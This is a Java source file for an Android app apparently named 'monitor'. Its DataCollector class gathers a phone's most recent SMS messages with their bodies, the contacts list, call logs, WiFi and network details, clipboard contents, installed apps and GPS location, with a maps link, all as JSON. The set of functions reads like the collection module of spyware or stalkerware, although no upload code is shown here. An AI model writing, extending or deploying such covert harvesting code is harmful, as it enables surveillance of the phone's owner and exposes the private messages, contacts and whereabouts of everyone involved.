package com.nora.monitor;

import android.content.Context;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Bundle;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.content.ClipboardManager;
import android.content.ClipData;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.text.format.Formatter;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.List;

public class DataCollector {

    private static final String TAG = "DataCollector";

    // ── SMS ──────────────────────────────────────────────────────────────────

    public static JSONArray getSms(Context ctx) throws Exception {
        JSONArray arr = new JSONArray();
        try (Cursor c = ctx.getContentResolver().query(
                Telephony.Sms.CONTENT_URI,
                new String[]{
                    Telephony.Sms.ADDRESS,
                    Telephony.Sms.BODY,
                    Telephony.Sms.DATE,
                    Telephony.Sms.TYPE
                },
                null, null,
                Telephony.Sms.DATE + " DESC LIMIT 200")) {
            if (c == null) return arr;
            while (c.moveToNext()) {
                JSONObject m = new JSONObject();
                m.put("address", c.getString(0));
                m.put("body",    c.getString(1));
                m.put("date",    c.getLong(2));
                m.put("type",    c.getInt(3) == Telephony.Sms.MESSAGE_TYPE_INBOX ? "inbox" : "sent");
                arr.put(m);
            }
        }
        return arr;
    }

    // ── Contacts ─────────────────────────────────────────────────────────────

    public static JSONArray getContacts(Context ctx) throws Exception {
        JSONArray arr = new JSONArray();
        try (Cursor c = ctx.getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[]{
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER
                },
                null, null,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC")) {
            if (c == null) return arr;
            while (c.moveToNext()) {
                JSONObject o = new JSONObject();
                o.put("name",   c.getString(0));
                o.put("number", c.getString(1));
                arr.put(o);
            }
        }
        return arr;
    }

    // ── Call logs ────────────────────────────────────────────────────────────

    public static JSONArray getCallLogs(Context ctx) throws Exception {
        JSONArray arr = new JSONArray();
        try (Cursor c = ctx.getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                new String[]{
                    CallLog.Calls.NUMBER,
                    CallLog.Calls.CACHED_NAME,
                    CallLog.Calls.DATE,
                    CallLog.Calls.DURATION,
                    CallLog.Calls.TYPE
                },
                null, null,
                CallLog.Calls.DATE + " DESC LIMIT 100")) {
            if (c == null) return arr;
            String[] types = {"", "incoming", "outgoing", "missed"};
            while (c.moveToNext()) {
                JSONObject o = new JSONObject();
                o.put("number",   c.getString(0));
                o.put("name",     c.getString(1));
                o.put("date",     c.getLong(2));
                o.put("duration", c.getLong(3));
                int t = c.getInt(4);
                o.put("type", t >= 1 && t <= 3 ? types[t] : "unknown");
                arr.put(o);
            }
        }
        return arr;
    }

    // ── WiFi info ─────────────────────────────────────────────────────────────

    public static JSONObject getWifiInfo(Context ctx) throws Exception {
        JSONObject o = new JSONObject();
        WifiManager wm = (WifiManager) ctx.getApplicationContext()
                .getSystemService(Context.WIFI_SERVICE);
        if (wm == null) { o.put("error", "no wifi manager"); return o; }

        WifiInfo info = wm.getConnectionInfo();
        if (info != null) {
            String ssid = info.getSSID();
            if (ssid != null) ssid = ssid.replace("\"", "");
            o.put("ssid",    ssid);
            o.put("bssid",   info.getBSSID());
            o.put("ip",      Formatter.formatIpAddress(info.getIpAddress()));
            o.put("rssi",    info.getRssi());
            o.put("link_speed_mbps", info.getLinkSpeed());
        }

        ConnectivityManager cm = (ConnectivityManager) ctx.getSystemService(Context.CONNECTIVITY_SERVICE);
        if (cm != null) {
            NetworkInfo ni = cm.getActiveNetworkInfo();
            if (ni != null) {
                o.put("connected",    ni.isConnected());
                o.put("network_type", ni.getTypeName());
            }
        }
        return o;
    }

    // ── Clipboard ─────────────────────────────────────────────────────────────

    public static String getClipboard(Context ctx) {
        try {
            ClipboardManager cm = (ClipboardManager) ctx.getSystemService(Context.CLIPBOARD_SERVICE);
            if (cm == null || !cm.hasPrimaryClip()) return "";
            ClipData clip = cm.getPrimaryClip();
            if (clip == null || clip.getItemCount() == 0) return "";
            CharSequence text = clip.getItemAt(0).coerceToText(ctx);
            return text != null ? text.toString() : "";
        } catch (Exception e) {
            Log.w(TAG, "clipboard read failed: " + e.getMessage());
            return "";
        }
    }

    // ── Installed apps ────────────────────────────────────────────────────────

    public static JSONArray getInstalledApps(Context ctx) throws Exception {
        PackageManager pm = ctx.getPackageManager();
        List<ApplicationInfo> apps = pm.getInstalledApplications(PackageManager.GET_META_DATA);
        JSONArray arr = new JSONArray();
        for (ApplicationInfo app : apps) {
            // Skip system apps
            if ((app.flags & ApplicationInfo.FLAG_SYSTEM) != 0) continue;
            JSONObject o = new JSONObject();
            o.put("name",    pm.getApplicationLabel(app).toString());
            o.put("package", app.packageName);
            arr.put(o);
        }
        return arr;
    }

    // ── Location ──────────────────────────────────────────────────────────────

    public interface LocationCallback {
        void onLocation(JSONObject result);
    }

    public static void getLocation(Context ctx, LocationCallback cb) {
        try {
            LocationManager lm = (LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
            if (lm == null) { cb.onLocation(err("no location manager")); return; }

            // Try last known first (fast)
            Location last = null;
            try { last = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER); } catch (SecurityException ignored) {}
            if (last == null) {
                try { last = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER); } catch (SecurityException ignored) {}
            }

            if (last != null) {
                cb.onLocation(locationToJson(last, "cached"));
                return;
            }

            // Request fresh fix (single update)
            String provider = lm.isProviderEnabled(LocationManager.GPS_PROVIDER)
                    ? LocationManager.GPS_PROVIDER
                    : LocationManager.NETWORK_PROVIDER;

            lm.requestSingleUpdate(provider, new LocationListener() {
                @Override public void onLocationChanged(Location loc) {
                    cb.onLocation(locationToJson(loc, "fresh"));
                }
                @Override public void onStatusChanged(String p, int s, Bundle b) {}
                @Override public void onProviderEnabled(String p) {}
                @Override public void onProviderDisabled(String p) {
                    cb.onLocation(err("provider disabled"));
                }
            }, null);

        } catch (SecurityException e) {
            cb.onLocation(err("permission denied"));
        } catch (Exception e) {
            cb.onLocation(err(e.getMessage()));
        }
    }

    private static JSONObject locationToJson(Location loc, String source) {
        try {
            JSONObject o = new JSONObject();
            o.put("lat",      loc.getLatitude());
            o.put("lng",      loc.getLongitude());
            o.put("accuracy", loc.getAccuracy());
            o.put("altitude", loc.getAltitude());
            o.put("time",     loc.getTime());
            o.put("source",   source);
            o.put("maps_url", "https://maps.google.com/?q=" + loc.getLatitude() + "," + loc.getLongitude());
            return o;
        } catch (Exception e) {
            return err(e.getMessage());
        }
    }

    private static JSONObject err(String msg) {
        try { JSONObject o = new JSONObject(); o.put("error", msg); return o; }
        catch (Exception e) { return new JSONObject(); }
    }
}
